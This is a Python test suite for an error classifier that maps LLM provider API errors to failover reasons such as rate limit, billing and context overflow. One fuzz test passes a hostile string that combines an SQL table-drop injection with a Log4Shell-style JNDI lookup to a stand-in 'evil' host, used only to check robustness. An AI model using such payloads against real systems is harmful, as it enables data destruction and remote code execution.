"""Tests for the ported Hermes error_classifier package.

Origin: core/lib/hermes_adapted/error_classifier/
        (ported from NousResearch/hermes-agent, MIT)

No upstream test file existed for this module (same situation as the other
hermes_adapted ports without a .test.ts counterpart) — these tests are
written from the documented behavior in the source comments/docstrings,
covering every FailoverReason branch plus fuzz-testing-constraints.md
boundary cases (empty input, oversized input, malicious characters).
"""
from __future__ import annotations

from core.lib.hermes_adapted.error_classifier import (
    ClassifiedError,
    FailoverReason,
    classify_api_error,
)


class FakeAPIError(Exception):
    """Minimal stand-in for an SDK exception carrying status/body/response."""

    def __init__(self, message="", *, status_code=None, body=None, response=None):
        super().__init__(message)
        if status_code is not None:
            self.status_code = status_code
        if body is not None:
            self.body = body
        if response is not None:
            self.response = response


class FakeResponse:
    def __init__(self, payload: dict):
        self._payload = payload

    def json(self):
        return self._payload


# ── Status-code-driven branches ──────────────────────────────────────────

def test_401_is_auth_and_rotates_credential():
    result = classify_api_error(FakeAPIError("nope", status_code=401))
    assert result.reason is FailoverReason.auth
    assert result.retryable is False
    assert result.should_rotate_credential is True


def test_403_with_billing_pattern_is_billing():
    result = classify_api_error(FakeAPIError("spending limit reached", status_code=403))
    assert result.reason is FailoverReason.billing


def test_403_without_billing_pattern_is_auth():
    result = classify_api_error(FakeAPIError("forbidden", status_code=403))
    assert result.reason is FailoverReason.auth


def test_402_billing_exhaustion():
    result = classify_api_error(FakeAPIError("insufficient credits", status_code=402))
    assert result.reason is FailoverReason.billing
    assert result.retryable is False


def test_402_transient_usage_limit_is_rate_limit_not_billing():
    result = classify_api_error(FakeAPIError("usage limit, try again in 5 minutes", status_code=402))
    assert result.reason is FailoverReason.rate_limit
    assert result.retryable is True


def test_404_model_not_found():
    result = classify_api_error(FakeAPIError("model not found", status_code=404))
    assert result.reason is FailoverReason.model_not_found
    assert result.should_fallback is True


def test_404_openrouter_policy_block_is_distinct_from_model_not_found():
    result = classify_api_error(
        FakeAPIError("No endpoints available matching your guardrail restrictions", status_code=404)
    )
    assert result.reason is FailoverReason.provider_policy_blocked
    assert result.should_fallback is False


def test_404_generic_with_no_signal_is_unknown_not_model_not_found():
    result = classify_api_error(FakeAPIError("not found", status_code=404))
    assert result.reason is FailoverReason.unknown
    assert result.retryable is True


def test_413_payload_too_large():
    result = classify_api_error(FakeAPIError("too big", status_code=413))
    assert result.reason is FailoverReason.payload_too_large
    assert result.should_compress is True


def test_429_rate_limit():
    result = classify_api_error(FakeAPIError("slow down", status_code=429))
    assert result.reason is FailoverReason.rate_limit
    assert result.should_rotate_credential is True


def test_503_overloaded():
    result = classify_api_error(FakeAPIError("overloaded", status_code=503))
    assert result.reason is FailoverReason.overloaded


def test_529_overloaded():
    result = classify_api_error(FakeAPIError("overloaded", status_code=529))
    assert result.reason is FailoverReason.overloaded


def test_other_4xx_is_format_error():
    result = classify_api_error(FakeAPIError("teapot", status_code=418))
    assert result.reason is FailoverReason.format_error
    assert result.retryable is False


def test_other_5xx_is_server_error():
    result = classify_api_error(FakeAPIError("oops", status_code=599))
    assert result.reason is FailoverReason.server_error
    assert result.retryable is True


# ── 400 branch (status_400.py) ───────────────────────────────────────────

def test_400_multimodal_tool_content_unsupported():
    result = classify_api_error(FakeAPIError("text is not set", status_code=400))
    assert result.reason is FailoverReason.multimodal_tool_content_unsupported


def test_400_image_too_large():
    result = classify_api_error(FakeAPIError("image exceeds 5 MB maximum", status_code=400))
    assert result.reason is FailoverReason.image_too_large


def test_400_invalid_encrypted_content():
    result = classify_api_error(
        FakeAPIError("encrypted content for item X could not be verified", status_code=400)
    )
    assert result.reason is FailoverReason.invalid_encrypted_content


def test_400_request_validation_not_misrouted_to_context_overflow():
    # "max_tokens" is also a context-overflow pattern; unsupported-parameter
    # must win so the loop doesn't retry the same bad parameter forever.
    result = classify_api_error(
        FakeAPIError("Unsupported parameter: 'max_tokens' is not supported with this model", status_code=400)
    )
    assert result.reason is FailoverReason.format_error
    assert result.retryable is False


def test_400_context_overflow():
    result = classify_api_error(FakeAPIError("maximum context length exceeded", status_code=400))
    assert result.reason is FailoverReason.context_overflow
    assert result.should_compress is True


def test_400_generic_large_session_is_context_overflow():
    result = classify_api_error(
        FakeAPIError("Error", status_code=400),
        approx_tokens=150000, context_length=200000, num_messages=10,
    )
    assert result.reason is FailoverReason.context_overflow


def test_400_generic_small_session_is_format_error():
    result = classify_api_error(
        FakeAPIError("Error", status_code=400),
        approx_tokens=10, context_length=200000, num_messages=1,
    )
    assert result.reason is FailoverReason.format_error


# ── Special cases (special_cases.py) — checked before status code ───────

def test_content_policy_blocked_no_status_code():
    result = classify_api_error(FakeAPIError("Your request was flagged by our moderation system"))
    assert result.reason is FailoverReason.content_policy_blocked
    assert result.retryable is False
    assert result.should_fallback is True


def test_thinking_signature_mismatch():
    result = classify_api_error(
        FakeAPIError("thinking block signature is invalid", status_code=400)
    )
    assert result.reason is FailoverReason.thinking_signature


def test_thinking_block_cannot_be_modified():
    result = classify_api_error(
        FakeAPIError("thinking blocks in the latest assistant message cannot be modified", status_code=400)
    )
    assert result.reason is FailoverReason.thinking_signature


def test_long_context_tier_gate():
    result = classify_api_error(
        FakeAPIError("extra usage required for long context", status_code=429)
    )
    assert result.reason is FailoverReason.long_context_tier
    assert result.should_compress is True


def test_oauth_long_context_beta_forbidden():
    result = classify_api_error(
        FakeAPIError("The long context beta is not yet available for this subscription", status_code=400)
    )
    assert result.reason is FailoverReason.oauth_long_context_beta_forbidden


def test_llama_cpp_grammar_pattern():
    result = classify_api_error(
        FakeAPIError("error parsing grammar: json-schema-to-grammar failed", status_code=400)
    )
    assert result.reason is FailoverReason.llama_cpp_grammar_pattern


def test_grok_entitlement_no_status_code():
    result = classify_api_error(
        FakeAPIError("You do not have an active Grok subscription")
    )
    assert result.reason is FailoverReason.auth
    assert result.should_fallback is True


# ── Error-code-driven branch (message_classifier.classify_by_error_code) ─

def test_error_code_context_length_exceeded():
    err = FakeAPIError(
        "bad request",
        body={"error": {"code": "context_length_exceeded", "message": "too long"}},
    )
    result = classify_api_error(err)
    assert result.reason is FailoverReason.context_overflow


# ── Message-pattern branch (no status code) ──────────────────────────────

def test_no_status_code_billing_message():
    result = classify_api_error(FakeAPIError("insufficient credits remaining"))
    assert result.reason is FailoverReason.billing


def test_no_status_code_timeout_message():
    result = classify_api_error(RuntimeError("the upstream request timed out"))
    assert result.reason is FailoverReason.timeout


# ── SSL transient / disconnect / transport (classify.py tail) ───────────

def test_ssl_transient_alert_is_timeout():
    result = classify_api_error(RuntimeError("SSL routine failed: bad record mac"))
    assert result.reason is FailoverReason.timeout


def test_server_disconnect_large_session_is_context_overflow():
    result = classify_api_error(
        RuntimeError("server disconnected without sending a response"),
        approx_tokens=190000, context_length=200000, num_messages=5,
    )
    assert result.reason is FailoverReason.context_overflow


def test_server_disconnect_small_session_is_timeout():
    result = classify_api_error(
        RuntimeError("server disconnected without sending a response"),
        approx_tokens=10, context_length=200000, num_messages=1,
    )
    assert result.reason is FailoverReason.timeout


def test_transport_error_type_name_is_timeout():
    class ReadTimeout(Exception):
        pass

    result = classify_api_error(ReadTimeout("read timed out"))
    assert result.reason is FailoverReason.timeout


def test_connection_error_instance_is_timeout():
    result = classify_api_error(ConnectionError("connection reset"))
    assert result.reason is FailoverReason.timeout


def test_unclassifiable_is_unknown():
    result = classify_api_error(ValueError("something weird happened"))
    assert result.reason is FailoverReason.unknown
    assert result.retryable is True


# ── Provider-wrapped body extraction (OpenRouter metadata.raw) ──────────

def test_openrouter_metadata_raw_surfaces_inner_context_overflow():
    inner = '{"error": {"message": "context length exceeded for this model"}}'
    err = FakeAPIError(
        "Provider returned error",
        status_code=400,
        body={"error": {"message": "Provider returned error", "metadata": {"raw": inner}}},
    )
    result = classify_api_error(err)
    assert result.reason is FailoverReason.context_overflow


def test_response_json_extraction_path():
    err = FakeAPIError(
        "bad request",
        status_code=400,
        response=FakeResponse({"error": {"message": "model not found"}}),
    )
    result = classify_api_error(err)
    assert result.reason is FailoverReason.model_not_found


# ── status_code via .status attribute (some SDKs) and RateLimitError ────

def test_status_attribute_fallback():
    class StatusOnlyError(Exception):
        status = 429

    result = classify_api_error(StatusOnlyError("slow down"))
    assert result.reason is FailoverReason.rate_limit


def test_rate_limit_error_type_without_status_code_forces_429():
    class RateLimitError(Exception):
        pass

    result = classify_api_error(RateLimitError("too many requests"))
    assert result.reason is FailoverReason.rate_limit


def test_status_code_found_via_cause_chain():
    inner = FakeAPIError("inner", status_code=500)
    try:
        try:
            raise inner
        except FakeAPIError as exc:
            raise RuntimeError("wrapped") from exc
    except RuntimeError as wrapped:
        result = classify_api_error(wrapped)
    assert result.reason is FailoverReason.server_error


# ── Fuzz / boundary cases (fuzz-testing-constraints.md) ──────────────────

def test_empty_message_does_not_crash():
    result = classify_api_error(FakeAPIError(""))
    assert isinstance(result, ClassifiedError)
    assert result.reason is FailoverReason.unknown


def test_oversized_message_does_not_crash():
    result = classify_api_error(FakeAPIError("x" * 65536))
    assert isinstance(result, ClassifiedError)


def test_malicious_characters_in_message_do_not_crash():
    result = classify_api_error(FakeAPIError("'; DROP TABLE users; --\x00\r\n${jndi:ldap://evil}"))
    assert isinstance(result, ClassifiedError)


def test_unicode_message_does_not_crash():
    result = classify_api_error(FakeAPIError("超过最大长度 — context length exceeded"))
    assert result.reason is FailoverReason.context_overflow


def test_negative_token_counts_do_not_crash():
    result = classify_api_error(
        FakeAPIError("server disconnected"), approx_tokens=-1, context_length=200000, num_messages=-1,
    )
    assert isinstance(result, ClassifiedError)


def test_malformed_body_is_not_a_dict_does_not_crash():
    err = FakeAPIError("oops", status_code=400, body="not-a-dict")
    result = classify_api_error(err)
    assert isinstance(result, ClassifiedError)


def test_message_extraction_truncates_to_500_chars():
    err = FakeAPIError("z" * 1000, status_code=418)
    result = classify_api_error(err)
    assert len(result.message) <= 500
